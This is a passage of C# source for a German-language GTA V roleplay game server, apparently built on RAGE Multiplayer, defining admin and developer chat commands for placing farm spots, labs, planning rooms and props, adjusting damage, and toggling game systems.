            uint BlipType = 685 + (uint)farm_id;

            if (previewBlip != null)
                previewBlip.Delete();
            if (previewMarkers.Count > 0)
                previewMarkers.ForEach(marker => marker.Delete());

            Vector3 pos;
            if (l_DbPlayer.HasData("mark"))
            {
                pos = l_DbPlayer.GetData("mark");
            }
            else
            {
                pos = l_DbPlayer.Player.Position;
            }

            NAPI.Task.Run(() =>
            {
                previewBlip = Blips.Create(pos, $"FarmSpot-ID: {farm_id}", BlipType, 1.0f, true, 2, 255);
                previewMarkers.Add(Markers.Create(1, pos, new Vector3(0, 0, 0), new Vector3(0, 0, 0), 2.0f, 255, 255, 0, 0, 0));
                for (double i = 0; i < 360; i += (360 / range))
                {
                    double angle = Math.PI * i / 180.0;
                    double sinAngle = Math.Sin(angle);
                    double cosAngle = Math.Cos(angle);
                    Vector3 innerPos = pos.Add(new Vector3(range * cosAngle, range * sinAngle, 0));
                    previewMarkers.Add(Markers.Create(1, innerPos.Add(new Vector3(0, 0, 2f)), new Vector3(0, 0, 0), new Vector3(0, 0, 0), 1.0f, 255, 0, 255, 0, 0));
                }
            });
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void previewjails(Player p_Player)
        {
            if (!Configuration.Instance.DevMode)
                return;

            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.DevMode) return;

            if (previewBlip != null)
                previewBlip.Delete();
            if (previewMarkers.Count > 0)
                previewMarkers.ForEach(marker => marker.Delete());

            foreach (JailCell jail in JailCellModule.Instance.GetAll().Values)
            {
                NAPI.Task.Run(() =>
                {
                    Vector3 pos = jail.Position;

                    previewMarkers.Add(Markers.Create(1, pos, new Vector3(0, 0, 0), new Vector3(0, 0, 0), 2.0f, 255, 255, 0, 0, 0));
                    for (double i = 0; i < 360; i += (360 / jail.Range))
                    {
                        double angle = Math.PI * i / 180.0;
                        double sinAngle = Math.Sin(angle);
                        double cosAngle = Math.Cos(angle);
                        Vector3 innerPos = pos.Add(new Vector3(jail.Range * cosAngle, jail.Range * sinAngle, 0));
                        previewMarkers.Add(Markers.Create(1, innerPos.Add(new Vector3(0, 0, 2f)), new Vector3(0, 0, 0), new Vector3(0, 0, 0), 1.0f, 255, 0, 255, 0, 0));
                    }
                });
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void createfarmspot(Player p_Player, string args)
        {
            if (!Configuration.Instance.DevMode)
                return;
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.DevMode) return;
            string[] strings = args.Split(" ");
            if (!int.TryParse(strings[0], out int farm_id)) return;
            if (!int.TryParse(strings[1], out int range)) return;
            uint BlipType = 685 + (uint)farm_id;


            if (previewBlip != null)
                previewBlip.Delete();
            if (previewMarkers.Count > 0)
                previewMarkers.ForEach(marker => marker.Delete());

            NAPI.Task.Run(() =>
            {
                farmspotsBlips.Add(Blips.Create(l_DbPlayer.Player.Position, $"FarmSpot-ID: {farm_id}", BlipType, 1.0f, true, 2, 255));
                farmspotsMarker.Add(Markers.Create(1, l_DbPlayer.Player.Position.Add(new Vector3(0, 0, 10f)), new Vector3(0, 0, 0), new Vector3(0, 0, 0), 3.0f, 255, 255, 0, 0, 0));
                for (double i = 0; i < 360; i += 90)
                {
                    double angle = Math.PI * i / 180.0;
                    double sinAngle = Math.Sin(angle);
                    double cosAngle = Math.Cos(angle);
                    Vector3 innerPos = l_DbPlayer.Player.Position.Add(new Vector3(range * cosAngle, range * sinAngle, 0));
                    farmspotsMarker.Add(Markers.Create(1, innerPos, new Vector3(0, 0, 0), new Vector3(0, 0, 0), 5.0f, 255, 0, 255, 0, 0));
                }
            });

            string pos_x = l_DbPlayer.Player.Position.X.ToString().Replace(",", ".");
            string pos_y = l_DbPlayer.Player.Position.Y.ToString().Replace(",", ".");
            string pos_z = l_DbPlayer.Player.Position.Z.ToString().Replace(",", ".");
            string heading = l_DbPlayer.Player.Rotation.Z.ToString().Replace(",", ".");
            string query = $"INSERT INTO `farm_positions` (`farm_id`, `pos_x`, `pos_y`, `pos_z`, `range`)" +
                $"VALUES ('{farm_id}', '{pos_x}', '{pos_y}', '{pos_z}', '{range}');";
            Console.WriteLine(query);
            MySQLHandler.ExecuteAsync(query);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void createplanningroom(Player p_Player, string myString)
        {
            if (!Configuration.Instance.DevMode) return;

            var l_DbPlayer = p_Player.GetPlayer();

            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!uint.TryParse(myString, out uint teamId)) return;

            Team team = TeamModule.Instance.GetById((int)teamId);
            if (team == null) return;

            string teamName = TeamModule.Instance.GetById((int)teamId).Name;

            string pos_x = l_DbPlayer.Player.Position.X.ToString().Replace(",", ".");
            string pos_y = l_DbPlayer.Player.Position.Y.ToString().Replace(",", ".");
            string pos_z = l_DbPlayer.Player.Position.Z.ToString().Replace(",", ".");
            string heading = l_DbPlayer.Player.Rotation.Z.ToString().Replace(",", ".");

            string query = $"INSERT INTO `jump_points` (`name`, `pos_x`, `pos_y`, `pos_z`, `heading`, `dimension`, `destionation`, `teams`, `range`, `locked`, `unbreakable`, `hide_infos`)" +
                $"VALUES ('Planningroom Eingang - {team.Name}', '{pos_x}', '{pos_y}', '{pos_z}', '{heading}', '0', '0', '{teamId}', '1.2', '1', '1', '1');";

            string query2 = $"INSERT INTO `jump_points` (`name`, `pos_x`, `pos_y`, `pos_z`, `heading`, `dimension`, `destionation`, `teams`, `range`, `locked`, `unbreakable`, `hide_infos`)" +
                $"VALUES ('Planningroom Ausgang - {team.Name}', '2737.84', '-374.079', '-47.993', '186.073', '{teamId}', '0', '{teamId}', '1.2', '1', '1', '1');";

            MySQLHandler.ExecuteAsync(query);
            MySQLHandler.ExecuteAsync(query2);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void createplanningroomveh(Player p_Player, string myString)
        {
            if (!Configuration.Instance.DevMode) return;

            var l_DbPlayer = p_Player.GetPlayer();

            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!uint.TryParse(myString, out uint teamId)) return;

            Team team = TeamModule.Instance.GetById((int)teamId);
            if (team == null) return;

            string teamName = TeamModule.Instance.GetById((int)teamId).Name;

            string pos_x = l_DbPlayer.Player.Position.X.ToString().Replace(",", ".");
            string pos_y = l_DbPlayer.Player.Position.Y.ToString().Replace(",", ".");
            string pos_z = l_DbPlayer.Player.Position.Z.ToString().Replace(",", ".");
            string heading = l_DbPlayer.Player.Rotation.Z.ToString().Replace(",", ".");

            string query = $"INSERT INTO `jump_points` (`name`, `pos_x`, `pos_y`, `pos_z`, `heading`, `dimension`, `destionation`, `teams`, `inside_vehicle`, `range`, `locked`, `unbreakable`, `hide_infos`)" +
                $"VALUES ('Planningroom Fahrzeug Eingang - {team.Name}', '{pos_x}', '{pos_y}', '{pos_z}', '{heading}', '0', '0', '{teamId}', '1', '3', '1', '1', '1');";

            string query2 = $"INSERT INTO `jump_points` (`name`, `pos_x`, `pos_y`, `pos_z`, `heading`, `dimension`, `destionation`, `teams`, `inside_vehicle`, `range`, `locked`, `unbreakable`, `hide_infos`)" +
                $"VALUES ('Planningroom Fahrzeug Ausgang - {team.Name}', '2681.15', '-361.22', '-55.6107', '271.308', '{teamId}', '0', '{teamId}', '1', '3', '1', '1', '1');";

            MySQLHandler.ExecuteAsync(query);
            MySQLHandler.ExecuteAsync(query2);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void createlab(Player p_Player, string myString)
        {
            if (!Configuration.Instance.DevMode)
                return;
            var l_DbPlayer = p_Player.GetPlayer();
            if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
            {
                l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.DevMode) return;
            if (!uint.TryParse(myString, out uint teamId)) return;

            int destinationId = MethlaboratoryModule.Instance.GetLaboratoryByTeamId(teamId).JumpPointEingang.DestinationId;

            Team team = TeamModule.Instance.GetById((int)teamId);
            if (team == null)
                return;
            methBlips.Add(Blips.Create(l_DbPlayer.Player.Position, $"Labor - TeamId: {teamId}", 403, 1.0f, true, TeamModule.Instance.GetById((int)teamId).BlipColor, 255));
            methMarker.Add(Markers.Create(1, l_DbPlayer.Player.Position, new Vector3(0, 0, 0), new Vector3(0, 0, 0), 1.0f, 255, 255, 0, 0, 0));

            int number = methBlips.Where(blip => blip.Color == TeamModule.Instance.GetById((int)teamId).BlipColor).Count();
            string teamName = TeamModule.Instance.GetById((int)teamId).Name;
            foreach (var user in Players.Players.Instance.GetValidPlayers())
            {
                user.SendNewNotification($"{teamName}: {number}");
            }


            string pos_x = l_DbPlayer.Player.Position.X.ToString().Replace(",", ".");
            string pos_y = l_DbPlayer.Player.Position.Y.ToString().Replace(",", ".");
            string pos_z = l_DbPlayer.Player.Position.Z.ToString().Replace(",", ".");
            string heading = l_DbPlayer.Player.Rotation.Z.ToString().Replace(",", ".");
            string query = $"INSERT INTO `jump_points` (`name`, `pos_x`, `pos_y`, `pos_z`, `heading`, `dimension`, `destionation`, `teams`, `range`, `locked`, `unbreakable`, `hide_infos`)" +
                $"VALUES ('Methlaboratory - {team.Name}', '{pos_x}', '{pos_y}', '{pos_z}', '{heading}', '0', '{destinationId}', '{teamId}', '3', '1', '1', '1');";
            Console.WriteLine(query);
            MySQLHandler.ExecuteAsync(query);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void loadproperty(Player player, string args)
        {
            //int interiorid, string propname, int color
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            string[] strings = args.Split(" ");
            if (strings.Length < 1) return;
            if (strings.Length < 2)
                strings.Append("1");
            foreach (var user in Players.Players.Instance.GetValidPlayers())
            {
                user.SendNewNotification("Lade Prop: " + strings[0]);
                user.Player.TriggerNewClient("loadprop", strings[0], strings[1], dbPlayer.Player.Position.X, dbPlayer.Player.Position.Y, dbPlayer.Player.Position.Z);
            }

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void removeproperty(Player player, string args)
        {
            //int interiorid, string propname
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            string[] strings = args.Split(" ");
            if (strings.Length < 1) return;
            foreach (var user in Players.Players.Instance.GetValidPlayers())
            {
                user.SendNewNotification("Entlade Prop: " + strings[0]);
                user.Player.TriggerNewClient("removeprop", strings[0], dbPlayer.Player.Position.X, dbPlayer.Player.Position.Y, dbPlayer.Player.Position.Z);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void loadiplproperty(Player player, string args)
        {
            //int interiorid, string propname, int color
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            string[] strings = args.Split(" ");
            if (strings.Length < 1) return;
            if (strings.Length < 2)
                strings.Append("1");
            foreach (var user in Players.Players.Instance.GetValidPlayers())
            {
                user.SendNewNotification("Lade Prop: " + strings[0]);
                user.Player.TriggerNewClient("loadiplprop", strings[0], strings[1], strings[2]);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void removeiplproperty(Player player, string args)
        {
            //int interiorid, string propname
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            string[] strings = args.Split(" ");
            if (strings.Length < 2) return;
            foreach (var user in Players.Players.Instance.GetValidPlayers())
            {
                user.SendNewNotification("Entlade Prop: " + strings[0]);
                user.Player.TriggerNewClient("removeiplprop", strings[0], strings[1]);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void restart(Player p_Player, string p_Args)
        {
            if (Configuration.Instance.DevMode) return;

            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var l_DbPlayer = p_Player.GetPlayer();
                if (l_DbPlayer == null || !l_DbPlayer.CanAccessMethod())
                {
                    l_DbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                    return;
                }

                var l_Command = p_Args.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
                if (l_Command.Length != 2)
                {
                    l_DbPlayer.SendNewNotification(GlobalMessages.General.Usage("/restart", "Minuten", "Grund"), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                if (!uint.TryParse(l_Command[0], out uint l_Minuten))
                {
                    l_DbPlayer.SendNewNotification(GlobalMessages.General.Usage("/restart", "Minuten", "Grund"), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                Main.ScheduleRestart(l_Minuten, l_Command[1]);
            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setdmg(Player p_Player, string args)
        {
            var dbPlayer = p_Player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!float.TryParse(args, out float damagemulti))
            {
                dbPlayer.SendNewNotification("ERROR!", NotificationType.ADMIN, "Fehler");
                return;
            }

            foreach (DbPlayer xPlayer in Players.Players.Instance.GetValidPlayers())
            {
                xPlayer.Player.TriggerNewClient("setPlayerDamageMultiplier", damagemulti);
                xPlayer.SendNewNotification("Waffen-Multiplikator geändert auf " + damagemulti.ToString());
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setdamagelog(Player p_Player, string args)
        {
            var dbPlayer = p_Player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!bool.TryParse(args, out bool state))
            {
                dbPlayer.SendNewNotification("ERROR!", NotificationType.ADMIN, "Fehler Eingabe: true/false");
                return;
            }
            Configuration.Instance.DamageLog = state;
            foreach (DbPlayer xPlayer in Players.Players.Instance.GetValidPlayers())
            {
                xPlayer.Player.TriggerNewClient("setDmgLg", Configuration.Instance.DamageLog);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setmeleedmg(Player p_Player, string args)
        {
            var dbPlayer = p_Player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!float.TryParse(args, out float damagemulti))
            {
                dbPlayer.SendNewNotification("ERROR!", NotificationType.ADMIN, "Fehler");
                return;
            }

            foreach (DbPlayer xPlayer in Players.Players.Instance.GetValidPlayers())
            {
                xPlayer.Player.TriggerNewClient("setPlayerMeleeDamageMultiplier", damagemulti);
                xPlayer.SendNewNotification("Melee-Multiplikator geändert auf " + damagemulti.ToString());
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void testobjectdata(Player player, string args)
        {
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            string[] strings = args.Split(" ");

            string function = strings[0];
            int bone = 0;
            Int32.TryParse(strings[1], out bone);
            int model = 0;
            Int32.TryParse(strings[2], out model);
            float offset_x = 0;
            float.TryParse(strings[3], out offset_x);
            float offset_y = 0;
            float.TryParse(strings[4], out offset_y);
            float offset_z = 0;
            float.TryParse(strings[5], out offset_z);
            float rotation_x = 0;
            float.TryParse(strings[6], out rotation_x);
            float rotation_y = 0;
            float.TryParse(strings[7], out rotation_y);
            float rotation_z = 0;
            float.TryParse(strings[8], out rotation_z);

            dbPlayer.Player.TriggerNewClient("addattachmenttest", function, bone, model, offset_x, offset_y, offset_z, rotation_x, rotation_y, rotation_z);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void hash(Player player, string propname)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.DevMode) return;

            uint l_Hash = NAPI.Util.GetHashKey(propname);
            dbPlayer.SendNewNotification(l_Hash.ToString());
        }

        // Attach object function
        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void attach(Player player, string args)
        {
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Int32.TryParse(args, out int attachid))
            {
                return;
            }

            AttachmentModule.Instance.AddAttachment(dbPlayer, attachid);
        }

        /*
        // Attach object function
        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void attachveh(Player player, string args)
        {
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod() || !dbPlayer.RageExtension.IsInVehicle)
            {
                dbPlayer.SendNewNotification(MSG.Error.NoPermissions());
                return;
            }

            SxVehicle sxVehicle = dbPlayer.Player.Vehicle.GetVehicle();

            if (sxVehicle == null || !sxVehicle.IsValid()) return;

            if (!Int32.TryParse(args, out int attachid))
            {
                return;
            }

            AttachmentModule.Instance.AddAttachmentVehicle(sxVehicle, (Attachment)attachid);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void detachveh(Player player, string args)
        {
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod() || !dbPlayer.RageExtension.IsInVehicle)
            {
                dbPlayer.SendNewNotification(MSG.Error.NoPermissions());
                return;
            }

            SxVehicle sxVehicle = dbPlayer.Player.Vehicle.GetVehicle();

            if (sxVehicle == null || !sxVehicle.IsValid()) return;

            if (!Int32.TryParse(args, out int attachid))
            {
                return;
            }

            AttachmentModule.Instance.RemoveVehicleAttachment(sxVehicle, (Attachment)attachid);
        }*/

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void detach(Player player, string args)
        {
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }
            if (!Int32.TryParse(args, out int attachid))
            {
                return;
            }

            AttachmentModule.Instance.RemoveAttachment(dbPlayer, attachid);
        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void blockcallstest(Player p_Player)
        {
            var dbPlayer = p_Player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }


            dbPlayer.PhoneSettings.blockCalls ^= true;
            dbPlayer.SendNewNotification("blockCalls umgeschalten");

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void updatemode(Player player, string args)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            Configuration.Instance.IsUpdateModeOn = !Configuration.Instance.IsUpdateModeOn;
            if (Configuration.Instance.IsUpdateModeOn)
                dbPlayer.SendNewNotification("Update Mode aktiviert");
            else
                dbPlayer.SendNewNotification("Update Mode deaktiviert");
        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void toggletuning(Player p_Player)
        {
            var dbPlayer = p_Player.GetPlayer();
            if (dbPlayer == null)
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (dbPlayer.RankId != 11 && dbPlayer.RankId != (int)AdminLevelTypes.Founder && dbPlayer.RankId != 8 && dbPlayer.RankId != (int)AdminLevelTypes.Management)
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            Configuration.Instance.TuningActive = !Configuration.Instance.TuningActive;
            if (!Configuration.Instance.TuningActive)
                dbPlayer.SendNewNotification("Tuning deaktiviert!");
            else
                dbPlayer.SendNewNotification("Tuning aktiviert!");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void togglelipsync(Player p_Player)
        {
            var dbPlayer = p_Player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (dbPlayer.RankId != 11 && dbPlayer.RankId != (int)AdminLevelTypes.Founder && dbPlayer.RankId != 8 && dbPlayer.RankId != (int)AdminLevelTypes.Management)
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            Configuration.Instance.LipsyncActive = !Configuration.Instance.LipsyncActive;
            if (!Configuration.Instance.LipsyncActive)
                dbPlayer.SendNewNotification("Lippen-Synchro deaktiviert!");
            else
                dbPlayer.SendNewNotification("Lippen-Synchro aktiviert!");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setlevel(Player player, string commandParams = "")
        {
            try
            {
                var dbPlayer = player.GetPlayer();
                if (dbPlayer == null || !dbPlayer.CanAccessMethod()) return;

                var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();

                if (command.Length != 2)
                {
                    dbPlayer.SendNewNotification(

                        GlobalMessages.General.Usage("/setlevel", "Name", "Level"), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                if (command[0].Length < 2) return;
                if (command[1].Length < 1) return;

                var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);
                if (findPlayer == null || !findPlayer.IsValid())
                {
                    dbPlayer.SendNewNotification("Der Buerger konnte nicht gefunden werden ", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                }

                if (!int.TryParse(command[1], out var level)) return;
                if (command[1] == null || string.IsNullOrWhiteSpace(command[1])) return;
                if (level <= 0) return;

                findPlayer.Level = level;
                findPlayer.SendNewNotification($"Dein Level wurde auf {level.ToString()} geändert!");
                dbPlayer.SendNewNotification($"Du hast das Level von {findPlayer.GetName()} auf {level.ToString()} geänddert!");
            }
            catch (Exception e)
            {
                Logger.Crash(e);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void togglejumppoints(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.JumpPointsEnabled)
                dbPlayer.SendNewNotification("Jump Points aktiviert!");
            else
                dbPlayer.SendNewNotification("Jump Points deaktiviert!");

            Configuration.Instance.JumpPointsEnabled = !Configuration.Instance.JumpPointsEnabled;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void togglemethlab(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.MethLabEnabled)
                dbPlayer.SendNewNotification("Methlabor-Systeme wieder angeschalten!");
            else
                dbPlayer.SendNewNotification("Alle Methlabor-Systeme abgeschalten!");

            Configuration.Instance.MethLabEnabled = !Configuration.Instance.MethLabEnabled;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void toggledigging(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.JailescapeEnabled)
                dbPlayer.SendNewNotification("Alle Gefängnis-Tunnel-Ausbruch Koikarpfensysteme wieder angeschalten!");
            else
                dbPlayer.SendNewNotification("Alle Gefängnis-Tunnel-Ausbruch Koikarpfensysteme abgeschalten!");

            Configuration.Instance.JailescapeEnabled = !Configuration.Instance.JailescapeEnabled;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void toggletug(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.MeertraeubelEnabled)
                dbPlayer.SendNewNotification("Alle Meerträubel-Relevanten Systeme wieder angeschalten!");
            else
                dbPlayer.SendNewNotification("Alle Meerträubel-Relevanten Systeme abgeschalten!");

            Configuration.Instance.MeertraeubelEnabled = !Configuration.Instance.MeertraeubelEnabled;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void toggleblackmoney(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.BlackMoneyEnabled)
                dbPlayer.SendNewNotification("Schwarzgeldsystem wieder angeschalten!");
            else
                dbPlayer.SendNewNotification("Alle Schwarzgeldsysteme abgeschalten!");

            Configuration.Instance.BlackMoneyEnabled = !Configuration.Instance.BlackMoneyEnabled;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void toggleekey(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.InventoryActivated)
                dbPlayer.SendNewNotification("E-Muskel wurde wieder angeschalten.");
            else
                dbPlayer.SendNewNotification("E-Muskel wurde abgeschalten!");

            Configuration.Instance.EKeyActivated = !Configuration.Instance.EKeyActivated;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void toggleinvstate(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.InventoryActivated)
                dbPlayer.SendNewNotification("Inventar wurde wieder angeschalten!");
            else
                dbPlayer.SendNewNotification("Inventar wurde abgeschalten!");

            Configuration.Instance.InventoryActivated = !Configuration.Instance.InventoryActivated;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void adealer(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            Random rand = new Random();
            player.SetPosition(DealerModule.Instance.Get((uint)rand.Next(0, DealerModule.Instance.GetAll().Count)).Position);

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void duty(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!dbPlayer.IsInDuty())
            {
                dbPlayer.SetDuty(true);
                dbPlayer.SendNewNotification("Dienst aktiviert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.SUCCESS);
            }
            else
            {
                dbPlayer.SetDuty(false);
                dbPlayer.SendNewNotification("Dienst deaktiviert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ERROR);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void noclip(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }


            if (!dbPlayer.NoClip)
            {
                dbPlayer.SendNewNotification("Starte NOCLIP");
                dbPlayer.Player.TriggerNewClient("toggleNoClip", true);
                NAPI.Task.Run(() => { player.Transparency = 0; });
                dbPlayer.NoClip = true;
            }
            else
            {
                dbPlayer.SendNewNotification("Beende NOCLIP");
                dbPlayer.Player.TriggerNewClient("toggleNoClip", false);
                NAPI.Task.Run(() => { player.Transparency = 255; });
                dbPlayer.NoClip = false;
            }

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void aduty(Player player)
        {
            var dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!dbPlayer.IsInAdminDuty())
            {
                dbPlayer.SetAdminDuty(true);

                int maskId = 135;
                int chestId = 287;
                int leggingsId = 114;
                int bootId = 78;
                int bodyId = 166;

                string skinModel = "FreeModeMale01";

                if (dbPlayer.Customization.Gender == 1)
                {
                    chestId = 300;
                    leggingsId = 121;
                    bootId = 82;
                    bodyId = 207;
                    dbPlayer.SetClothes(8, 2, 0);
                    skinModel = "FreeModeFemale01";
                }
                else
                {
                    dbPlayer.SetClothes(8, 15, 0);
                }

                if (!Enum.TryParse(skinModel, true, out PedHash skin)) return;
